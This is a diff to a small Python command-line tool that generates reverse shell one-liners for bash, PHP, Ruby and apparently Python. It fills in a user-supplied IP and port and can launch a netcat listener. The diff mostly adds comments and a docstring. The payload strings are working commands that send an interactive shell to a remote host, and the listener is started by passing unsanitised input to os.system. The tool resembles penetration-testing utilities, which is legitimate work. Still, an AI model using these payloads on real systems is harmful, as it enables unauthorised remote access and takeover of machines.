@@ -1,5 +1,9 @@
+
 import os
 import click
+
+
+# Reverse Shell One-Liner Payloads
 
 BASH="""bash -i >& /dev/tcp/<ip>/<port> 0>&1\n\nexec 5<>/dev/tcp/<ip>/<port>\ncat <&5 | while read line; do $line 2>&5 >&5; done"""
 
@@ -11,6 +15,7 @@ PHP="""php -r '$sock=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'"
 
 RUBY="""ruby -rsocket -e'f=TCPSocket.open("<ip>",<port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
 
+# Parse User option and return the correct reverse shell payload
 def revType(payload):
     if payload == "python":
         return PYTHON
@@ -25,16 +30,25 @@ def revType(payload):
     else:
         return "[ERROR] Invalid type"
 
+
+"""
+    Name: printrev
+    Param:
+        types: (str) Type of revershell payload 
+        ip: (str) IP of the user
+        port: (str) PORT of the user 
+        listener: (boolean) True: Open a netcat listener. False: Doesn't open listener
+
+    Return:
+        (str) Reverse shell payload with user's IP and PORT 
+        [optional] A netcat listener with sh to full pty instruction 
+"""
 @click.command()
 @click.option('--types','-t',help='type of reverse shell payload (python, ruby, php, bash, etc...)', required=True)
 @click.option('--listener', '-l', help='Opens a netcat listener', is_flag=True)
 @click.argument('ip', required=True)
 @click.argument('port', required=True)
 def printrev(types, ip, port, listener):
-    #print("[DEBUG] [+] Your type: ", types)
-    #print("[DEBUG] [+] Your ip: ", ip)
-    #print("[DEBUG] [+] Your port: ", port)
-
     inputType = revType(types)
 
     payload1 = inputType.replace("<ip>", ip)
@@ -48,15 +62,8 @@ def printrev(types, ip, port, listener):
 
         print(helper)
         
-        #print("[DEBUG] Listener is ON")
         cmd = "nc -lvnp " + port
-        
-        #print("[DEUBG] cmd = ", cmd)
         os.system(cmd)
-
-#@click.option('--listener', '-l', help = 'Opens a listener', default=True)
-#def openListener(listener, ip, port):
-#    print("[DEBUG] [+] Listener ON, ip = ", ip, "port = ", port) 
 
 if __name__ == "__main__":
     print()
